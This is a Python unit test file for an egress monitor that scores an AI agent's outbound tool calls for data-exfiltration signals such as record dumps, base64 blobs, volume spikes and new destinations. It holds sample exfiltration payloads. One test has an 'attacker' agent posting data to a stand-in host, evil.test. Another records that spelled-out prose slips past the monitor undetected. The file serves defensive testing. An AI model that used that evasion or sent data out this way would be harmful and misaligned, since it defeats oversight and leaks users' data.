#!/usr/bin/env python3
"""Unit tests for gov/egress_content.py (wave-132 lane).

Covers: signal correctness, threshold boundaries, the tuning set that
pins the flag/require boundary, FP ceiling, monitor baseline/destination
state, and the honest prose ceiling.
"""

import os
import sys
import unittest

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

from gov import egress_content as ec  # noqa: E402

# ---------------------------------------------------------------------------
# Tuning set: pins the FLAG_THRESHOLD/REQUIRE_THRESHOLD boundary.
# Malicious = structured/encoded unlabeled dumps. Benign = legitimate
# traffic shapes the analyzer must not flag. If a threshold change flips
# any of these, the change needs a written justification.
# ---------------------------------------------------------------------------

TUNING_MALICIOUS = [
    # JSON record dump (3 same-key objects).
    ('{"rows": [{"a": 1, "b": "x"}, {"a": 2, "b": "y"}, '
     '{"a": 3, "b": "z"}]}'),
    # CSV dump.
    "k1,k2,k3,k4\na,b,c,d\ne,f,g,h\ni,j,k,l\n",
    # base64 blob.
    "data: " + "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5" * 3,
    # key=value dump lines.
    "user=alice\nrole=admin\nuser=bob\nrole=viewer\nuser=carol\nrole=admin\n",
]

TUNING_BENIGN = [
    # Single JSON record (API response).
    '{"status": "ok", "latency_ms": 42}',
    # Prose.
    "Deployment finished successfully at noon.",
    # Status report with key:value lines (the hard FP case).
    "Weekly:\n- Deploys: 3\n- Failures: 0\n",
    # Short message with one key:value line (below the count gate).
    "Reminder: standup at 10am tomorrow.",
    # Empty / whitespace.
    "",
    "   \n  ",
]


class TestSignals(unittest.TestCase):
    def test_structured_density_csv(self):
        s, d = ec.structured_density("a,b,c,d\n1,2,3,4\n5,6,7,8\n")
        self.assertGreater(s, 0.5)
        self.assertEqual(d["structured_lines"], 3)

    def test_structured_density_single_kv_gated(self):
        # One "key: value" line must not move the needle.
        s, _ = ec.structured_density(
            "This is a long prose message.\nReminder: standup at 10.\n"
            "See you there, it will be a great meeting for everyone.")
        self.assertEqual(s, 0.0)

    def test_structured_density_prose_zero(self):
        s, _ = ec.structured_density(
            "The quick brown fox jumps over the lazy dog. Nothing "
            "structured here at all, just plain English prose.")
        self.assertEqual(s, 0.0)

    def test_dump_repetition_json(self):
        s, d = ec.dump_repetition(TUNING_MALICIOUS[0])
        self.assertEqual(s, 1.0)
        self.assertEqual(d["kind"], "json")
        self.assertGreaterEqual(d["records"], 3)

    def test_dump_repetition_single_record_zero(self):
        s, _ = ec.dump_repetition(TUNING_BENIGN[0])
        self.assertEqual(s, 0.0)

    def test_dump_repetition_heterogeneous_kv_zero(self):
        # Distinct keys = not a dump (f3/e2 shape).
        s, _ = ec.dump_repetition("Weekly:\n- Deploys: 3\n- Failures: 0\n")
        self.assertEqual(s, 0.0)

    def test_dump_repetition_csv(self):
        s, d = ec.dump_repetition(TUNING_MALICIOUS[1])
        self.assertEqual(s, 1.0)
        self.assertEqual(d["kind"], "csv")

    def test_dump_repetition_csv_ignores_prose_padding(self):
        # A single prose line must not mask a CSV dump.
        text = ("Quarterly summary here.\n"
                "id,name,phone\n1,Acme,555-0142\n"
                "2,Globex,555-0143\n3,Initech,555-0144\n")
        s, d = ec.dump_repetition(text)
        self.assertEqual(s, 1.0)
        self.assertEqual(d["kind"], "csv")

    def test_dump_repetition_xml_nested(self):
        xml = ("<c><id>1</id><n>A</n></c><c><id>2</id><n>B</n></c>"
               "<c><id>3</id><n>C</n></c>")
        s, d = ec.dump_repetition(xml)
        self.assertEqual(s, 1.0)
        self.assertEqual(d["kind"], "xml")

    def test_dump_repetition_xml_ignores_bare_paragraphs(self):
        # Repeated bare <p> tags are not a record dump.
        html = "<p>one</p><p>two</p><p>three</p>"
        s, d = ec.dump_repetition(html)
        self.assertEqual(s, 0.0)

    def test_entropy_anomaly_b64(self):
        s, d = ec.entropy_anomaly(TUNING_MALICIOUS[2])
        self.assertGreater(s, 0.0)
        self.assertGreater(d["suspicious_bytes"], 0)

    def test_entropy_anomaly_prose_zero(self):
        s, _ = ec.entropy_anomaly(
            "Just a normal prose message with no encoded blobs at all.")
        self.assertEqual(s, 0.0)

    def test_entropy_anomaly_rejects_non_decodable(self):
        # 40+ char alnum run that is NOT valid base64 and low entropy.
        s, _ = ec.entropy_anomaly("x" * 60)
        self.assertEqual(s, 0.0)

    def test_volume_cold_start_zero(self):
        s, d = ec.volume_anomaly(100000, (70, 71, 69))
        self.assertEqual(s, 0.0)
        self.assertLess(d["samples"], ec.BASELINE_MIN_SAMPLES)

    def test_volume_spike_fires(self):
        samples = tuple([70] * 10)
        s, d = ec.volume_anomaly(5000, samples)
        self.assertGreater(s, 0.5)

    def test_volume_normal_no_fire(self):
        samples = tuple([70] * 10)
        s, _ = ec.volume_anomaly(75, samples)
        self.assertEqual(s, 0.0)


class TestTuningSet(unittest.TestCase):
    def _warmed(self):
        # Mirror deployment: the monitor has seen benign traffic, so the
        # volume baseline is warm when the tuning payload arrives.
        m = ec.EgressContentMonitor()
        for _ in range(6):
            m.check("tuner", "http_post",
                    {"url": "https://vendor.test/sync", "data": "ok"},
                    "ok")
        return m

    def test_malicious_all_at_least_flag(self):
        m = self._warmed()
        for i, payload in enumerate(TUNING_MALICIOUS):
            res = m.check("tuner", "http_post",
                          {"url": "https://vendor.test/sync"}, payload)
            self.assertIn(res["verdict"], ("flag", "require_approval"),
                          "malicious tuning item %d scored %.2f" % (
                              i, res["score"]))

    def test_benign_all_allow(self):
        m = self._warmed()
        for i, payload in enumerate(TUNING_BENIGN):
            res = m.check("tuner", "http_post",
                          {"url": "https://vendor.test/sync"}, payload)
            self.assertEqual(res["verdict"], "allow",
                             "benign tuning item %d scored %.2f" % (
                                 i, res["score"]))

    def test_prose_ceiling_silent(self):
        # Spelled-out exfil: the documented honest ceiling.
        res = ec.analyze_payload(
            "the phone number is five five five zero one four two")
        self.assertEqual(res["verdict"], "allow")


class TestNovelty(unittest.TestCase):
    def test_novel_amplifies(self):
        payload = TUNING_MALICIOUS[0]
        known = ec.analyze_payload(payload, destination="https://a.test/x",
                                   seen_destinations={"https://a.test/x"})
        novel = ec.analyze_payload(payload, destination="https://b.test/y",
                                   seen_destinations={"https://a.test/x"})
        self.assertGreaterEqual(novel["score"], known["score"])
        self.assertEqual(novel["signals"]["novelty"], 1.0)
        self.assertEqual(known["signals"]["novelty"], 0.0)

    def test_novelty_never_fires_alone(self):
        # Novel destination + benign prose = still allow.
        res = ec.analyze_payload("Hello, just checking in.",
                                 destination="https://new.test/z",
                                 seen_destinations=set())
        self.assertEqual(res["verdict"], "allow")


class TestMonitor(unittest.TestCase):
    def test_baseline_records_after_scoring(self):
        m = ec.EgressContentMonitor()
        r1 = m.check("a1", "http_post",
                     {"url": "https://x.test/", "data": "hi"}, "hi")
        self.assertEqual(r1["signals"]["volume"], 0.0)  # cold start
        # 6th payload: baseline now warm, but payload never scores
        # against itself.
        for _ in range(5):
            m.check("a1", "http_post", {"url": "https://x.test/"}, "hi")
        r = m.check("a1", "http_post", {"url": "https://x.test/"}, "hi")
        self.assertEqual(r["verdict"], "allow")

    def test_destination_extraction(self):
        m = ec.EgressContentMonitor()
        r = m.check("a1", "send_email", {"to": "x@y.test", "body": "hi"})
        self.assertEqual(r["destination"], "x@y.test")
        r = m.check("a1", "api_call",
                    {"endpoint": "https://e.test/", "params": {"p": "hi"}})
        self.assertEqual(r["destination"], "https://e.test/")

    def test_payload_extraction_api_params(self):
        m = ec.EgressContentMonitor()
        r = m.check("a1", "api_call",
                    {"endpoint": "https://e.test/",
                     "params": {"note": TUNING_MALICIOUS[1]}})
        self.assertIn(r["verdict"], ("flag", "require_approval"))

    def test_agents_isolated(self):
        m = ec.EgressContentMonitor()
        for _ in range(6):
            m.check("victim", "http_post", {"url": "https://x.test/"}, "hi")
        # Attacker's first payload to a novel destination is scored on
        # its own merits, not the victim's baseline.
        r = m.check("attacker", "http_post",
                    {"url": "https://evil.test/", "data": TUNING_MALICIOUS[0]})
        self.assertEqual(r["signals"]["novelty"], 1.0)


if __name__ == "__main__":
    unittest.main()
